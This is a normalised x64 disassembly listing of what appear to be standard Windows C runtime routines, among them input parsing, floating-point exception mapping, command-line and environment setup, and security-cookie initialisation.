mov rcx r12
mov [ rsp + 0x34 ] r14d
call sub_14004a620
xor r9d r9d
mov edi eax
mov [ rsp + 0x3c ] eax
jmp r-xdata
test eax eax
je r-xdata
xor r9d r9d
mov r14b bl
add r10 r11
mov [ rbp - 0x5 ] 0x20
cmp [ rsp + 0x30 ] r9b
jne r-xdata
dec [ rsp + 0x34 ]
cmp edi r15d
je r-xdata
mov eax [ rsp + 0x5c ]
mov ecx esi
movsx ebx dil
shl eax 0x4
mov [ rsp + 0x5c ] eax
call sub_14003e550
mov esi [ rsp + 0x5c ]
mov edi ebx
xor r9d r9d
and edi 0xffffffdf
sub edi 0x7
test eax eax
cmovne edi ebx
mov [ rsp + 0x3c ] edi
movzx ecx dil
call sub_14003e550
xor r9d r9d
test eax eax
je r-xdata
dec [ rsp + 0x34 ]
cmp edi r15d
je r-xdata
shl [ rbp - 0x70 ] 0x4
mov ecx esi
movsx ebx dil
call sub_14003e550
mov rsi [ rbp - 0x70 ]
mov edi ebx
and edi 0xffffffdf
xor r9d r9d
sub edi 0x7
test eax eax
cmovne edi ebx
mov [ rsp + 0x3c ] edi
movzx ecx dil
call sub_14003e550
xor r9d r9d
test eax eax
je r-xdata
xor r12d r12d
mov r12d [ rsp + 0x48 ]
mov r13 [ rsp + 0x60 ]
mov r14d [ rsp + 0x34 ]
mov r13 [ rsp + 0x60 ]
mov r12d [ rsp + 0x48 ]
mov r14d [ rsp + 0x34 ]
mov rcx r13
sub r12d edx
add r14d edx
call sub_14004a620
xor r9d r9d
mov edi eax
mov [ rsp + 0x3c ] eax
jmp r-xdata
mov r14d [ rsp + 0x34 ]
mov eax r14d
test cl cl
jne r-xdata
xor r9d r9d
mov rdx [ rsp + 0x60 ]
mov ecx edi
call sub_140042504
mov r8d 0x1
xor r9d r9d
cmp [ rsp + 0x30 ] r9b
jne r-xdata
cmp r13d 0x73
jne r-xdata
mov rax [ rbp - 0x68 ]
cmp rbx rax
je r-xdata
mov r13d 0x1
mov rcx r12
add r14d r13d
mov [ rsp + 0x34 ] r14d
call sub_14004a620
xor r9d r9d
mov edi eax
mov [ rsp + 0x3c ] eax
cmp [ rsp + 0x50 ] r9d
je r-xdata
cmp al 0x58
je r-xdata
cmp edi 0x30
jne r-xdata
mov bl dl
cmp [ r10 ] r9b
je r-xdata
add r10 r11
cmp al 0x2d
jne r-xdata
mov r14d [ rsp + 0x34 ]
inc [ rsp + 0x68 ]
mov eax [ rsp + 0x5c ]
jmp r-xdata
mov esi [ rsp + 0x5c ]
mov rdx rbx
mov ecx edi
call sub_140042504
xor r9d r9d
mov rbx [ rsp + 0x60 ]
add [ rsp + 0x34 ] eax
mov rcx rbx
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
jmp r-xdata
sub r12d eax
je r-xdata
cmp r13d 0x6f
jne r-xdata
mov rsi [ rbp - 0x70 ]
mov rdx rbx
mov ecx edi
call sub_140042504
xor r9d r9d
mov rbx [ rsp + 0x60 ]
add [ rsp + 0x34 ] edx
mov rcx rbx
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
jmp r-xdata
sub r12d edx
je r-xdata
cmp r13d 0x6f
jne r-xdata
test eax eax
jne r-xdata
cmp [ rsp + 0x50 ] r9d
movzx ecx dil
cmove r12d r15d
call sub_14003e550
xor esi esi
jmp r-xdata
mov r14d [ rsp + 0x4c ]
cmp [ rsp + 0x30 ] r9b
jne r-xdata
mov r8d 0x1
add rbx r8
test r12 r12
je r-xdata
cmp r13d 0x7b
jne r-xdata
cmp edi 0x9
jl r-xdata
mov r13d 0x78
jmp r-xdata
sub esi 0x2
mov [ rsp + 0x48 ] esi
cmp esi r13d
jge r-xdata
mov eax 0x1
mov [ rsp + 0x58 ] eax
cmp r13d 0x78
je r-xdata
mov [ rsp + 0x70 ] r10
jmp r-xdata
movzx r8d al
mov r14b al
movzx eax al
and eax 0x7
mov edx r11d
shr r8 0x3
mov cl al
shl dl cl
or [ rbp + r8 - 0x10 ] dl
jmp r-xdata
test r14b r14b
je r-xdata
mov rcx [ rbp - 0x68 ]
test r14d r14d
je r-xdata
cmp r13d 0x78
je r-xdata
lea eax [ rsi + rsi * 4 ]
lea esi [ rax + rax ]
jmp r-xdata
cmp edi 0x38
jge r-xdata
cmp r13d 0x78
je r-xdata
lea rsi [ rsi + rsi * 4 ]
add rsi rsi
jmp r-xdata
cmp edi 0x38
jge r-xdata
mov eax r12d
mov ecx 0x1
sub r12d ecx
test eax eax
je r-xdata
mov rax [ rbp - 0x30 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov ecx 0x1
mov sil [ rax ]
cmp sil dil
jne r-xdata
mov r14d [ rsp + 0x34 ]
cmp [ rsp + 0x38 ] r9b
je r-xdata
mov rax [ rbp - 0x70 ]
mov [ rcx ] rax
mov ebx [ rsp + 0x68 ]
add ebx r8d
mov [ rsp + 0x68 ] ebx
cmp r13d 0x63
je r-xdata
cmp [ rsp + 0x50 ] r9d
je r-xdata
call sub_14003f1a4
xor r12d r12d
mov [ rax ] 0xc
mov r13d r12d
test sil sil
je r-xdata
test sil sil
je r-xdata
mov rax rdi
mov edx edi
sar rax 0x3
and edx 0x7
movsx ecx [ rbp + rax - 0x10 ]
movsx eax r14b
xor ecx eax
bt ecx edx
jae r-xdata
cmp edi 0x20
jne r-xdata
cmp edi 0xd
jle r-xdata
add bl r13b
sub r14d eax
mov [ rsp + 0x34 ] r14d
cmp edi r15d
je r-xdata
xor r9d r9d
cmp [ rsp + 0x50 ] r9d
je r-xdata
mov al [ r10 ]
cmp al bl
je r-xdata
mov cl [ r10 ]
cmp cl bl
je r-xdata
mov eax 0x1
lea esi [ rsi + rdi - 0x30 ]
add [ rsp + 0x58 ] eax
mov [ rsp + 0x5c ] esi
cmp [ rsp + 0x50 ] r9d
je r-xdata
shl esi 0x3
jmp r-xdata
lea eax [ rdi - 0x30 ]
mov edx 0x1
add [ rsp + 0x58 ] edx
movsxd rcx eax
add rsi rcx
mov [ rbp - 0x70 ] rsi
cmp [ rsp + 0x50 ] r9d
je r-xdata
shl rsi 0x3
jmp r-xdata
mov rax [ rsp + 0x78 ]
add [ rsp + 0x58 ] ecx
lea r9 [ rbp + 0x10 ]
mov [ rbx + rax ] dil
add rbx rcx
lea rax [ rbp - 0x78 ]
lea r8 [ rsp + 0x78 ]
lea rdx [ rbp - 0x58 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_14004a588
test eax eax
je r-xdata
mov esi [ rsp + 0x58 ]
test esi esi
je r-xdata
mov eax r12d
sub r12d ecx
test eax eax
je r-xdata
mov [ rcx ] ax
jmp r-xdata
mov [ rcx ] eax
jmp r-xdata
test sil sil
je r-xdata
mov [ rbx ] r12b
jmp r-xdata
mov [ rbx ] r12w
jmp r-xdata
mov rax [ rbp - 0x68 ]
mov r8d 0x1
mov [ rax ] dil
add rax r8
sub r12 r8
mov [ rbp - 0x68 ] rax
jmp r-xdata
movzx ecx dil
mov [ rbp - 0x60 ] dil
call sub_14004fd00
test eax eax
je r-xdata
mov edi 0x30
xor r9d r9d
mov [ rsp + 0x3c ] edi
jmp r-xdata
mov rdx r12
mov ecx edi
call sub_140042504
mov r13d 0x6f
sub esi eax
mov [ rsp + 0x48 ] esi
jne r-xdata
add r10 r11
mov [ rsp + 0x70 ] r10
cmp r14b cl
jae r-xdata
mov rcx r13
inc r14d
call sub_14004a620
movzx ecx al
mov edi eax
mov [ rsp + 0x3c ] eax
call sub_14003e550
mov eax 0x1
sub r14d eax
mov [ rsp + 0x34 ] r14d
cmp edi r15d
je r-xdata
cmp edi 0x65
je r-xdata
add r14d ecx
mov rcx r13
call sub_14004a620
lea r9 [ rbp + 0x10 ]
lea r8 [ rsp + 0x78 ]
mov edi eax
mov [ rsp + 0x3c ] eax
mov rax [ rsp + 0x78 ]
mov [ rbx + rax ] sil
lea rax [ rbp - 0x78 ]
inc rbx
lea rdx [ rbp - 0x58 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_14004a588
test eax eax
je r-xdata
mov [ rax ] r9b
jmp r-xdata
mov [ rax ] r9w
jmp r-xdata
cmp [ rbp - 0x78 ] 0x1
jne r-xdata
mov edx [ rsp + 0x34 ]
jmp r-xdata
mov eax 0x3f
lea r9 [ rbp - 0x30 ]
lea rdx [ rbp - 0x60 ]
mov [ rbp - 0x80 ] ax
mov rax [ rbp - 0x30 ]
lea rcx [ rbp - 0x80 ]
movsxd r8 [ rax + 0x10c ]
call sub_14004fb38
mov rax [ rbp - 0x68 ]
movzx r11d [ rbp - 0x80 ]
mov edx [ rsp + 0x34 ]
mov [ rax ] r11w
add rax 0x2
mov r8d 0x1
mov [ rbp - 0x68 ] rax
sub r12 r8
jmp r-xdata
mov rcx [ rsp + 0x60 ]
inc [ rsp + 0x34 ]
call sub_14004a620
mov [ rbp - 0x5f ] al
add bl al
mov r9b r14b
mov r14b cl
mov r9b cl
jmp r-xdata
xor r9d r9d
test esi esi
je r-xdata
mov rdx r13
mov ecx edi
call sub_140042504
mov eax 0x1
mov eax r12d
sub r12d ecx
test eax eax
je r-xdata
cmp edi 0x45
jne r-xdata
movzx ecx dil
xor r9d r9d
movzx eax r9b
movzx r8d r9b
mov edx r11d
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ rbp + r8 - 0x10 ] dl
xor r9d r9d
mov r14b r9b
jmp r-xdata
movzx r10d r14b
cmp r14b r9b
jae r-xdata
mov r13d r9d
jmp r-xdata
cmp [ rsp + 0x30 ] r9b
jne r-xdata
mov rax [ rsp + 0x78 ]
lea r9 [ rbp + 0x10 ]
lea r8 [ rsp + 0x78 ]
mov [ rbx + rax ] 0x65
add rbx rcx
lea rax [ rbp - 0x78 ]
lea rdx [ rbp - 0x58 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_14004a588
test eax eax
je r-xdata
mov eax r12d
sub r12d ecx
test eax eax
je r-xdata
movzx ecx r14b
mov r8 r10
mov edx r11d
and ecx 0x7
shr r8 0x3
add r14b r11b
shl dl cl
add r10 r11
or [ rbp + r8 - 0x10 ] dl
cmp r14b r9b
jb r-xdata
mov r10 [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add [ rsp + 0x68 ] eax
mov [ rbx + rsi ] r9b
movsx ebx [ rsp + 0x38 ]
mov rcx [ rw-data ]
sub ebx eax
call [ DecodePointer@IAT ]
mov rdx [ rbp - 0x68 ]
lea r9 [ rbp - 0x30 ]
mov r8 rsi
mov ecx ebx
call rax
jmp r-xdata
mov rcx r13
inc r14d
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
cmp eax 0x2d
jne r-xdata
mov rax [ rsp + 0x78 ]
add [ rsp + 0x58 ] ecx
lea r9 [ rbp + 0x10 ]
mov [ rbx + rax ] dil
add rbx rcx
lea rax [ rbp - 0x78 ]
lea r8 [ rsp + 0x78 ]
lea rdx [ rbp - 0x58 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_14004a588
test eax eax
je r-xdata
cmp eax 0x2b
jne r-xdata
mov rax [ rsp + 0x78 ]
lea r9 [ rbp + 0x10 ]
lea r8 [ rsp + 0x78 ]
mov [ rbx + rax ] dil
lea rax [ rbp - 0x78 ]
inc rbx
lea rdx [ rbp - 0x58 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_14004a588
xor ecx ecx
test eax eax
jne r-xdata
mov rcx r13
inc r14d
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
movzx ecx al
jmp r-xdata
movzx ecx dil
jmp r-xdata
xor ecx ecx
mov eax r12d
mov edx 0x1
sub r12d edx
test eax eax
jne r-xdata
call sub_14003e550
mov ecx 0x1
test eax eax
je r-xdata
call sub_14003e550
test eax eax
jne r-xdata
mov rcx r13
add r14d edx
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
mov r12d ecx
jmp r-xdata
mov eax r12d
mov edx 0x1
sub r12d edx
test eax eax
je r-xdata
mov rax [ rsp + 0x78 ]
add esi edx
lea r9 [ rbp + 0x10 ]
mov [ rbx + rax ] dil
add rbx rdx
lea rax [ rbp - 0x78 ]
lea rdx [ rbp - 0x58 ]
lea r8 [ rsp + 0x78 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_14004a588
test eax eax
je r-xdata
mov rcx r13
inc r14d
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
movzx ecx al
sub_14004b7b4
mov [ rsp + 0x10 ] rsi
push rbp
push rdi
push r12
mov rbp rsp
sub rsp 0x60
movsxd rdi ecx
mov r12d edx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_14003b928
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rbp - 0x20 ]
sar esi 0x8
movzx ecx sil
call sub_14004fcb8
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rbp + 0x38 ] dil
mov [ rbp + 0x39 ] 0x0
mov r9d edx
mov [ rbp + 0x38 ] sil
mov [ rbp + 0x39 ] dil
mov [ rbp + 0x3a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax r12d
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx eax [ rbp + 0x20 ]
cmp [ rbp - 0x8 ] al
je r-xdata
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rbp + 0x38 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rbp - 0x20 ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x20 ] rax
call sub_140049690
test eax eax
jne r-xdata
mov rsi [ rsp + 0x88 ]
add rsp 0x60
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_14004b89c
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe06d7363
jne r-xdata
xor eax eax
add rsp 0x28
retn
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov eax [ rax + 0x20 ]
cmp eax 0x19930520
je r-xdata
call sub_14004e7c8
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_14004b8f8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_140043bb0
xor r9d r9d
mov rbx rax
test rax rax
je r-xdata
xor eax eax
mov rdx [ rax + 0xa0 ]
mov rcx rdx
lea rax [ rdx + 0xc0 ]
cmp rcx rax
jae r-xdata
lea rax [ rdx + 0xc0 ]
add rcx 0x10
cmp rcx rax
jb r-xdata
mov rcx r9
cmp [ rcx ] edi
je r-xdata
cmp [ rcx ] edi
je r-xdata
mov r8 [ rcx + 0x8 ]
test r8 r8
je r-xdata
test rcx rcx
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rcx + 0x8 ] r9
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
cmp [ rcx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] r9
mov ecx [ rcx + 0x4 ]
call r8
mov edx 0x30
mov rax [ rbx + 0xa0 ]
add rdx 0x10
mov [ rdx + rax - 0x8 ] r9
cmp rdx 0xc0
jl r-xdata
cmp [ rcx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
cmp [ rcx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
cmp [ rcx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rcx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rcx ] 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rcx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rcx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
cmp [ rcx ] 0xc00002b5
jne r-xdata
mov [ rbx + 0xb0 ] 0x8a
jmp r-xdata
cmp [ rcx ] 0xc00002b4
mov eax edi
mov edx 0x8e
cmove eax edx
mov [ rbx + 0xb0 ] eax
mov [ rbx + 0xb0 ] 0x8d
jmp r-xdata
sub_14004bac8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
mov rbx [ rw-data ]
xor r12d r12d
mov edi r12d
test rbx rbx
jne r-xdata
movzx eax [ rbx ]
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_140041704
mov rdi rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
mov rcx rbx
call sub_140046974
lea rbx [ rbx + rax * 2 + 0x2 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] r12w
je r-xdata
mov rcx rbx
call sub_14003ad04
mov [ rw-data ] r12
mov [ rdi ] r12
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_140046974
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
lea rbx [ rbx + rax * 2 ]
cmp [ rbx ] r12w
jne r-xdata
movsxd rbp esi
mov edx 0x2
mov rcx rbp
call sub_140041704
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_14003ad04
mov [ rw-data ] r12
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_1400468c4
test eax eax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_1400436bc
int3
add rdi 0x8
sub_14004bc00
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r13
push r14
mov r11 [ rsp + 0x30 ]
xor esi esi
mov rbx r9
mov [ r11 ] esi
mov r10 rdx
mov [ r9 ] 0x1
test rdx rdx
je r-xdata
mov edx esi
mov r14d 0x22
mov [ rdx ] r8
add r10 0x8
inc [ r11 ]
test r8 r8
je r-xdata
test edx edx
mov eax esi
sete al
add rcx 0x2
mov edx eax
movzx eax r14w
jmp r-xdata
movzx eax [ rcx ]
add rcx 0x2
test ax ax
je r-xdata
movzx eax [ rcx ]
mov [ r8 ] ax
add r8 0x2
test edx edx
jne r-xdata
sub rcx 0x2
cmp [ rcx ] r14w
jne r-xdata
cmp ax 0x20
je r-xdata
test r10 r10
je r-xdata
cmp [ rcx ] 0x20
je r-xdata
test r8 r8
je r-xdata
cmp ax 0x9
jne r-xdata
inc [ rbx ]
mov rsi [ rsp + 0x18 ]
mov rdi [ rsp + 0x20 ]
mov rbx [ rsp + 0x10 ]
mov r13 [ rsp + 0x28 ]
pop r14
retn
mov [ r10 ] rsi
add rcx 0x2
jmp r-xdata
cmp [ rcx ] 0x9
jne r-xdata
mov edi esi
mov r13d 0x5c
mov [ r8 - 0x2 ] si
jmp r-xdata
cmp [ rcx ] si
je r-xdata
test r10 r10
je r-xdata
inc [ rbx ]
mov [ r10 ] r8
add r10 0x8
cmp [ rcx ] r13w
je r-xdata
add rcx 0x2
inc edx
cmp [ rcx ] r14w
jne r-xdata
test edx edx
jne r-xdata
test r9b dl
jne r-xdata
dec edx
test r8 r8
je r-xdata
movzx eax [ rcx ]
test ax ax
je r-xdata
shr edx 0x1
jmp r-xdata
test edi edi
je r-xdata
inc [ r11 ]
mov [ r8 ] r13w
add r8 0x2
test r8 r8
je r-xdata
test edi edi
jne r-xdata
test edi edi
mov eax esi
mov r9d esi
sete al
mov edi eax
lea rax [ rcx + 0x2 ]
cmp [ rax ] r14w
jne r-xdata
inc [ r11 ]
jmp r-xdata
mov [ r8 ] si
add r8 0x2
test r9d r9d
je r-xdata
cmp ax 0x20
je r-xdata
mov rcx rax
jmp r-xdata
cmp [ rcx ] si
je r-xdata
add rcx 0x2
jmp r-xdata
test r8 r8
je r-xdata
cmp ax 0x9
je r-xdata
mov r9d 0x1
mov edx esi
jmp r-xdata
inc [ r11 ]
mov [ r8 ] ax
add r8 0x2
sub_14004bd98
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
sub rsp 0x30
lea rdi [ rw-data ]
xor ebp ebp
mov r8d 0x104
mov rdx rdi
xor ecx ecx
mov [ rw-data ] bp
call [ GetModuleFileNameW@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
mov rbx rdi
cmp [ rbx ] bp
jne r-xdata
or eax 0xffffffff
movsxd rax [ rsp + 0x58 ]
mov rcx 0x7fffffffffffffff
cmp rax rcx
jae r-xdata
lea rax [ rsp + 0x58 ]
lea r9 [ rsp + 0x50 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_14004bc00
movsxd rsi [ rsp + 0x50 ]
mov rax 0x1fffffffffffffff
cmp rsi rax
jae r-xdata
lea rcx [ rax + rsi * 4 ]
add rax rax
add rcx rcx
cmp rcx rax
jb r-xdata
call sub_140041684
mov rdi rax
test rax rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x58 ]
lea r9 [ rsp + 0x50 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_14004bc00
mov r11d [ rsp + 0x50 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
sub_14004be88
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
call [ GetEnvironmentStringsW@IAT ]
xor ebx ebx
mov rdi rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
cmp [ rdi ] bx
je r-xdata
sub eax edi
add eax 0x2
movsxd rbp eax
mov rcx rbp
call sub_140041684
mov rsi rax
test rax rax
je r-xdata
add rax 0x2
cmp [ rax ] bx
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rax rbx
mov r8 rbp
mov rdx rdi
mov rcx rax
call sub_14003a8c0
mov rbx rsi
add rax 0x2
cmp [ rax ] bx
jne r-xdata
sub_14004bf10
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_14004bf48
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_14004bf80
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_14004c034
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_14003b928
movsx ecx [ rbx ]
call sub_140042a90
cmp eax 0x65
je r-xdata
movsx ecx [ rbx ]
call sub_140042a90
cmp eax 0x78
jne r-xdata
inc rbx
movzx ecx [ rbx ]
call sub_14003e550
test eax eax
jne r-xdata
mov rax [ rsp + 0x20 ]
mov dl [ rbx ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rbx ] cl
inc rbx
add rbx 0x2
mov al [ rbx ]
mov [ rbx ] dl
mov dl al
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
cmp [ rsp + 0x38 ] al
je r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_14004c0b4
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_14003b928
mov r11b [ rbx ]
mov rcx [ rsp + 0x20 ]
test r11b r11b
je r-xdata
mov al [ rbx ]
inc rbx
test al al
je r-xdata
mov rax [ rcx + 0x128 ]
mov rdx [ rax ]
mov al [ rdx ]
cmp [ rsp + 0x38 ] 0x0
je r-xdata
jmp r-xdata
inc rbx
mov r11b [ rbx ]
test r11b r11b
jne r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov al [ rbx ]
test al al
jne r-xdata
cmp r11b al
je r-xdata
cmp al 0x65
je r-xdata
mov rdx rbx
cmp al 0x45
je r-xdata
dec rbx
cmp [ rbx ] 0x30
je r-xdata
mov rax [ rcx + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
cmp [ rbx ] al
jne r-xdata
inc rbx
mov al [ rdx ]
inc rbx
inc rdx
mov [ rbx ] al
test al al
jne r-xdata
dec rbx
sub_14004c16c
push rbx
sub rsp 0x30
mov rax r8
mov rbx rdx
mov r8 r9
mov rdx rax
test ecx ecx
je r-xdata
lea rcx [ rsp + 0x40 ]
call sub_140051bd8
mov r11d [ rsp + 0x40 ]
mov [ rbx ] r11d
lea rcx [ rsp + 0x20 ]
call sub_140051ad8
mov r11 [ rsp + 0x20 ]
mov [ rbx ] r11
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_14004c1c8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x50
mov r12 rdx
mov rdx [ rsp + 0xa0 ]
mov rdi rcx
lea rcx [ rax - 0x38 ]
mov r15d r9d
movsxd rbx r8d
call sub_14003b928
test rdi rdi
jne r-xdata
test r12 r12
jne r-xdata
call sub_14003f1a4
lea ebx [ rdi + 0x16 ]
xor eax eax
test ebx ebx
cmovg eax ebx
add eax 0x9
cdqe
cmp r12 rax
ja r-xdata
call sub_14003f1a4
lea ebx [ r12 + 0x16 ]
mov [ rax ] ebx
call sub_140043760
cmp [ rsp + 0x48 ] r12b
je r-xdata
mov eax ebx
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x98 ] 0x0
mov rsi [ rsp + 0x90 ]
je r-xdata
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsi ] 0x2d
mov rdx rdi
jne r-xdata
xor ebp ebp
cmp [ rsi ] 0x2d
sete bpl
xor r13d r13d
add rbp rdi
test ebx ebx
setg r13b
test r13d r13d
je r-xdata
mov [ rax ] ebx
call sub_140043760
cmp [ rsp + 0x48 ] 0x0
je r-xdata
test ebx ebx
jle r-xdata
mov [ rdi ] 0x2d
lea rdx [ rdi + 0x1 ]
mov rcx rbp
call sub_14003f7f0
movsxd rcx r13d
mov rdx rbp
lea r8 [ rax + 0x1 ]
add rcx rbp
call sub_14003a8c0
xor ecx ecx
lea r8 [ r--data ]
cmp [ rsp + 0x98 ] cl
sete cl
add rbx rdx
add rbx rcx
sub rdi rbx
cmp r12 0xffffffffffffffff
mov rcx rbx
lea rdx [ r12 + rdi ]
cmove rdx r12
call sub_140042dcc
test eax eax
jne r-xdata
mov al [ rdx + 0x1 ]
